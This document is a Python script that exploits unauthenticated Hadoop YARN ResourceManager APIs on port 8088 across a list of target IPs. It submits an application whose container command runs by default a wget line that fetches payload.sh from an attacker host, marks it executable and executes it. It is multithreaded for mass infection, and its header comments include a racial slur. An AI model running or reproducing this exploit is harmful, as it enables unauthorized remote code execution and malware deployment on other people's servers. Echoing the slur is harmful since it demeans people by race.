# -*- coding: utf-8 -*-
import requests
import json
import argparse
import sys
import threading
from urllib3.exceptions import InsecureRequestWarning
#frostedflakes666 made this niggers
#not dropping the new dork find it urself
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Command to execute (edit this)
DEFAULT_CMD = "wget http://YOUR-IP/payload.sh -O /tmp/p.sh; chmod +x /tmp/p.sh; /tmp/p.sh"

def send_payload(target_ip, cmd):
    url_base = f"http://{target_ip}:8088/ws/v1/cluster"

    try:
        # Step 1: Get new application ID
        new_app = requests.post(f"{url_base}/apps/new-application", timeout=5, verify=False)
        if new_app.status_code != 200:
            print(f"[-] {target_ip} - Failed to get application ID")
            return

        app_id = new_app.json().get("application-id", None)
        if not app_id:
            print(f"[-] {target_ip} - No application-id received")
            return

        # Step 2: Send exploit payload
        payload = {
            "application-id": app_id,
            "application-name": "yarnloader",
            "am-container-spec": {
                "commands": {
                    "command": cmd
                }
            },
            "application-type": "YARN"
        }

        headers = {"Content-Type": "application/json"}
        r = requests.post(f"{url_base}/apps", data=json.dumps(payload), headers=headers, timeout=5, verify=False)

        if r.status_code in [200, 202]:
            print(f"[+] Exploit sent to {target_ip}")
        else:
            print(f"[-] {target_ip} - Exploit failed: {r.status_code}")
    except Exception as e:
        print(f"[!] {target_ip} - Error: {e}")

def thread_worker(ip, cmd):
    send_payload(ip.strip(), cmd)

def main():
    parser = argparse.ArgumentParser(description="YARN Remote Exploit Loader")
    parser.add_argument("-t", "--targets", required=True, help="Path to IP list")
    parser.add_argument("-c", "--cmd", default=DEFAULT_CMD, help="Command to run remotely")
    parser.add_argument("-T", "--threads", type=int, default=20, help="Number of threads")

    args = parser.parse_args()

    with open(args.targets, "r") as f:
        targets = f.readlines()

    threads = []
    for ip in targets:
        if not ip.strip():
            continue
        t = threading.Thread(target=thread_worker, args=(ip.strip(), args.cmd))
        t.start()
        threads.append(t)

        if len(threads) >= args.threads:
            for th in threads:
                th.join()
            threads = []

    for th in threads:
        th.join()

if __name__ == "__main__":
    main()
